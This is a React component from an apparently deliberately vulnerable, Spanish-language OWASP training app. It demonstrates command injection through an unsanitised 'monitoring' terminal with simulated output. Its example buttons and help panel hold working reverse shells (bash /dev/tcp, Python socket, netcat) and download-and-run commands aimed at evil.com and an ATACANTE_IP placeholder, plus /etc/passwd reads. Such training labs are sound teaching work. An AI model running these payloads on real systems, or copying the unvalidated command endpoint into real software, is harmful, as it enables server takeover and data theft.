import React, { useState } from 'react';

const CommandInjection: React.FC = () => {
    const [command, setCommand] = useState('');
    const [output, setOutput] = useState('');
    const [isExecuting, setIsExecuting] = useState(false);

    const executeCommand = async () => {
        setIsExecuting(true);
        try {
            // VULNERABILIDAD CRÍTICA: Ejecución directa de comandos del sistema
            // En un entorno real, esto ejecutaría comandos directamente en el servidor
            
            // Simular la ejecución de comando (en producción esto sería peligroso)
            const response = await fetch('/api/execute-command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ command: command }),
            }).catch(() => {
                // Simular respuesta cuando no hay backend real
                return {
                    ok: false,
                    json: async () => ({ 
                        error: 'Backend no disponible - Simulando ejecución local',
                        simulated: true,
                        command: command
                    })
                };
            });

            const data = await response.json();
            
            if (data.simulated) {
                // Simular diferentes tipos de comandos
                let simulatedOutput = '';
                const cmd = command.toLowerCase();
                
                if (cmd.includes('ls') || cmd.includes('dir')) {
                    simulatedOutput = `total 48
drwxr-xr-x 12 www-data www-data 4096 Sep 27 10:30 .
drwxr-xr-x  3 root     root     4096 Sep 20 14:15 ..
-rw-r--r--  1 www-data www-data  220 Sep 20 14:15 .bash_logout
-rw-r--r--  1 www-data www-data 3771 Sep 20 14:15 .bashrc
-rw-r--r--  1 www-data www-data  807 Sep 20 14:15 .profile
drwxr-xr-x  8 www-data www-data 4096 Sep 27 10:25 aplicaci-n-web-vulnerable-owasp-top-10
-rw-r--r--  1 www-data www-data 1337 Sep 27 09:15 passwords.txt
-rw-------  1 www-data www-data 2048 Sep 27 08:30 private_key.pem`;
                } else if (cmd.includes('whoami')) {
                    simulatedOutput = 'www-data';
                } else if (cmd.includes('id')) {
                    simulatedOutput = 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
                } else if (cmd.includes('uname')) {
                    simulatedOutput = 'Linux vulnerable-server 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux';
                } else if (cmd.includes('cat /etc/passwd')) {
                    simulatedOutput = `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:112:116:MySQL Server,,,:/nonexistent:/bin/false
kayzzi:x:1000:1000:kayzzi,,,:/home/kayzzi:/bin/bash`;
                } else if (cmd.includes('netstat') || cmd.includes('ss')) {
                    simulatedOutput = `Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN`;
                } else if (cmd.includes('ps aux')) {
                    simulatedOutput = `USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.1 167320 11788 ?        Ss   08:30   0:01 /sbin/init
www-data    1337  0.0  0.2  12345  2048 ?        S    09:15   0:00 /bin/bash -i
apache2     2021  0.1  1.2 456789 12345 ?        S    10:25   0:05 /usr/sbin/apache2`;
                } else if (cmd.includes('curl') || cmd.includes('wget')) {
                    simulatedOutput = '🚨 COMANDO DE DESCARGA DETECTADO 🚨\nEsto podría descargar un payload malicioso...';
                } else if (cmd.includes('nc') || cmd.includes('netcat')) {
                    simulatedOutput = '🚨 REVERSE SHELL DETECTADA 🚨\nConexión establecida con atacante...';
                } else if (cmd.includes('python') || cmd.includes('bash') || cmd.includes('sh')) {
                    simulatedOutput = '🚨 INTÉRPRETE EJECUTADO 🚨\nShell interactiva iniciada...';
                } else {
                    simulatedOutput = `Comando ejecutado: ${command}\n[Salida simulada del sistema]`;
                }
                
                setOutput(simulatedOutput);
            } else {
                setOutput(data.output || data.error || 'Sin respuesta del servidor');
            }
        } catch (error) {
            setOutput(`Error: ${error}`);
        }
        setIsExecuting(false);
    };

    const predefinedCommands = [
        { label: '📁 Listar archivos', cmd: 'ls -la', danger: 'low' },
        { label: '👤 Usuario actual', cmd: 'whoami', danger: 'low' },
        { label: '🆔 Info usuario', cmd: 'id', danger: 'low' },
        { label: '💻 Info sistema', cmd: 'uname -a', danger: 'medium' },
        { label: '👥 Ver usuarios', cmd: 'cat /etc/passwd', danger: 'high' },
        { label: '🌐 Conexiones red', cmd: 'netstat -tulpn', danger: 'high' },
        { label: '⚡ Procesos activos', cmd: 'ps aux', danger: 'high' },
        { label: '🚨 Reverse Shell', cmd: 'nc -e /bin/bash 192.168.1.100 4444', danger: 'critical' },
        { label: '💀 Download Payload', cmd: 'curl -o /tmp/shell.py http://evil.com/shell.py && python /tmp/shell.py', danger: 'critical' }
    ];

    const getDangerColor = (danger: string) => {
        switch (danger) {
            case 'low': return 'bg-green-600 hover:bg-green-700';
            case 'medium': return 'bg-yellow-600 hover:bg-yellow-700';
            case 'high': return 'bg-orange-600 hover:bg-orange-700';
            case 'critical': return 'bg-red-600 hover:bg-red-700 animate-pulse';
            default: return 'bg-gray-600 hover:bg-gray-700';
        }
    };

    return (
        <div>
            <h2 className="text-2xl font-bold text-accent mb-2">💀 Command Injection - Sistema de Monitoreo</h2>
            <p className="text-text-secondary mb-6">
                Escenario: La aplicación permite ejecutar comandos del sistema para "monitoreo", 
                pero no valida ni sanitiza la entrada del usuario, permitiendo ejecución arbitraria de comandos.
            </p>

            <div className="bg-primary p-6 rounded-lg shadow-lg border border-border-color">
                <div className="mb-4 p-4 rounded-lg bg-red-900/50 border border-red-500 text-red-300">
                    <p><strong className="font-bold">⚠️ PELIGRO EXTREMO:</strong> Esta funcionalidad permite ejecución directa de comandos del sistema.</p>
                    <p><strong>Impacto:</strong> Control total del servidor, robo de datos, reverse shells, escalación de privilegios.</p>
                </div>

                <h3 className="text-xl font-bold mb-4">🖥️ Terminal de Monitoreo del Sistema</h3>
                
                <div className="mb-4">
                    <label htmlFor="command" className="block mb-2 font-bold">Comando a ejecutar:</label>
                    <input 
                        id="command"
                        type="text" 
                        value={command}
                        onChange={(e) => setCommand(e.target.value)}
                        placeholder="Ingresa el comando del sistema..."
                        className="w-full bg-secondary p-3 rounded border border-border-color focus:outline-none focus:ring-2 focus:ring-accent font-mono"
                        onKeyPress={(e) => e.key === 'Enter' && executeCommand()}
                    />
                </div>

                <div className="mb-4">
                    <p className="text-sm text-gray-400 mb-2">Comandos de ejemplo:</p>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2">
                        {predefinedCommands.map((item, index) => (
                            <button
                                key={index}
                                onClick={() => setCommand(item.cmd)}
                                className={`text-xs px-3 py-2 rounded text-white transition-all ${getDangerColor(item.danger)}`}
                                title={`Peligrosidad: ${item.danger.toUpperCase()}`}
                            >
                                {item.label}
                            </button>
                        ))}
                    </div>
                </div>

                <button 
                    onClick={executeCommand}
                    disabled={isExecuting || !command.trim()}
                    className="w-full bg-red-600 hover:bg-red-700 disabled:bg-gray-600 text-white font-bold py-3 px-4 rounded transition-colors mb-4"
                >
                    {isExecuting ? '🔄 Ejecutando...' : '💀 EJECUTAR COMANDO'}
                </button>

                {output && (
                    <div className="p-4 bg-black rounded border border-green-500">
                        <h4 className="font-bold mb-2 text-green-400">$ Salida del comando:</h4>
                        <pre className="text-green-300 font-mono text-sm whitespace-pre-wrap overflow-x-auto">
                            {output}
                        </pre>
                    </div>
                )}

                <div className="mt-6 p-4 bg-gray-800 rounded border border-gray-600">
                    <h4 className="font-bold mb-2 text-red-300">🚨 Ejemplos de Reverse Shells:</h4>
                    <div className="text-sm space-y-2">
                        <div className="p-2 bg-gray-900 rounded">
                            <p className="text-yellow-300 font-semibold">Bash Reverse Shell:</p>
                            <code className="text-green-300 font-mono text-xs">
                                bash -i &gt;&amp; /dev/tcp/ATACANTE_IP/4444 0&gt;&amp;1
                            </code>
                        </div>
                        <div className="p-2 bg-gray-900 rounded">
                            <p className="text-yellow-300 font-semibold">Python Reverse Shell:</p>
                            <code className="text-green-300 font-mono text-xs">
                                python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATACANTE_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
                            </code>
                        </div>
                        <div className="p-2 bg-gray-900 rounded">
                            <p className="text-yellow-300 font-semibold">Netcat Reverse Shell:</p>
                            <code className="text-green-300 font-mono text-xs">
                                nc -e /bin/bash ATACANTE_IP 4444
                            </code>
                        </div>
                        <div className="p-2 bg-gray-900 rounded">
                            <p className="text-yellow-300 font-semibold">Curl + Execute:</p>
                            <code className="text-green-300 font-mono text-xs">
                                curl http://ATACANTE_IP/shell.sh | bash
                            </code>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default CommandInjection;